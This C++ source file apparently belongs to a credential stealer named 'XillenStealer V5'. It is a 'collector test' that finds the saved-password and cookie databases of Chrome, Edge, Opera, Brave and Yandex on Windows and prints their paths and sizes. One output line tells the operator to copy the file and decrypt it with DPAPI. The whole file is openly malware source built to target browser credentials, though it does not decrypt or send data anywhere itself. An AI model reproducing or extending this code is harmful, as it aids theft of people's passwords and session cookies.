#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>

std::string GetUserDataPath() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, path);
    return std::string(path);
}

bool FileExists(const std::string& path) {
    return std::filesystem::exists(path);
}

void CollectChromePasswords() {
    std::string userData = GetUserDataPath();
    std::string loginDb = userData + "\\Google\\Chrome\\User Data\\Default\\Login Data";
    
    std::cout << "\n=== CHROME PASSWORDS ===" << std::endl;
    
    if (FileExists(loginDb)) {
        std::cout << "[+] Found Chrome Login Data!" << std::endl;
        std::cout << "[+] Path: " << loginDb << std::endl;
        std::cout << "[+] File size: " << std::filesystem::file_size(loginDb) << " bytes" << std::endl;
        std::cout << "[!] To decrypt passwords, copy this file and decrypt with DPAPI" << std::endl;
    } else {
        std::cout << "[-] Chrome not found or no saved passwords" << std::endl;
    }
}

void CollectChromeCookies() {
    std::string userData = GetUserDataPath();
    std::string cookiesDb = userData + "\\Google\\Chrome\\User Data\\Default\\Cookies";
    
    std::cout << "\n=== CHROME COOKIES ===" << std::endl;
    
    if (FileExists(cookiesDb)) {
        std::cout << "[+] Found Chrome Cookies!" << std::endl;
        std::cout << "[+] Path: " << cookiesDb << std::endl;
        std::cout << "[+] File size: " << std::filesystem::file_size(cookiesDb) << " bytes" << std::endl;
    } else {
        std::cout << "[-] Chrome not found or no cookies" << std::endl;
    }
}

void CollectEdgePasswords() {
    std::string userData = GetUserDataPath();
    std::string loginDb = userData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
    
    std::cout << "\n=== EDGE PASSWORDS ===" << std::endl;
    
    if (FileExists(loginDb)) {
        std::cout << "[+] Found Edge Login Data!" << std::endl;
        std::cout << "[+] Path: " << loginDb << std::endl;
        std::cout << "[+] File size: " << std::filesystem::file_size(loginDb) << " bytes" << std::endl;
    } else {
        std::cout << "[-] Edge not found or no saved passwords" << std::endl;
    }
}

void CollectOperaPasswords() {
    char roamingPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, roamingPath);
    std::string loginDb = std::string(roamingPath) + "\\Opera Software\\Opera Stable\\Login Data";
    
    std::cout << "\n=== OPERA PASSWORDS ===" << std::endl;
    
    if (FileExists(loginDb)) {
        std::cout << "[+] Found Opera Login Data!" << std::endl;
        std::cout << "[+] Path: " << loginDb << std::endl;
        std::cout << "[+] File size: " << std::filesystem::file_size(loginDb) << " bytes" << std::endl;
    } else {
        std::cout << "[-] Opera not found or no saved passwords" << std::endl;
    }
}

void CollectBravePasswords() {
    std::string userData = GetUserDataPath();
    std::string loginDb = userData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data";
    
    std::cout << "\n=== BRAVE PASSWORDS ===" << std::endl;
    
    if (FileExists(loginDb)) {
        std::cout << "[+] Found Brave Login Data!" << std::endl;
        std::cout << "[+] Path: " << loginDb << std::endl;
        std::cout << "[+] File size: " << std::filesystem::file_size(loginDb) << " bytes" << std::endl;
    } else {
        std::cout << "[-] Brave not found or no saved passwords" << std::endl;
    }
}

void CollectYandexPasswords() {
    std::string userData = GetUserDataPath();
    std::string loginDb = userData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data";
    
    std::cout << "\n=== YANDEX PASSWORDS ===" << std::endl;
    
    if (FileExists(loginDb)) {
        std::cout << "[+] Found Yandex Login Data!" << std::endl;
        std::cout << "[+] Path: " << loginDb << std::endl;
        std::cout << "[+] File size: " << std::filesystem::file_size(loginDb) << " bytes" << std::endl;
    } else {
        std::cout << "[-] Yandex not found or no saved passwords" << std::endl;
    }
}

int main() {
    std::cout << "======================================" << std::endl;
    std::cout << "  XILLENSTEALER V5 - COLLECTOR TEST" << std::endl;
    std::cout << "======================================" << std::endl;
    
    CollectChromePasswords();
    CollectChromeCookies();
    CollectEdgePasswords();
    CollectOperaPasswords();
    CollectBravePasswords();
    CollectYandexPasswords();
    
    std::cout << "\n======================================" << std::endl;
    std::cout << "[+] Collection complete!" << std::endl;
    std::cout << "\nPress Enter to exit..." << std::endl;
    std::cin.get();
    
    return 0;
}
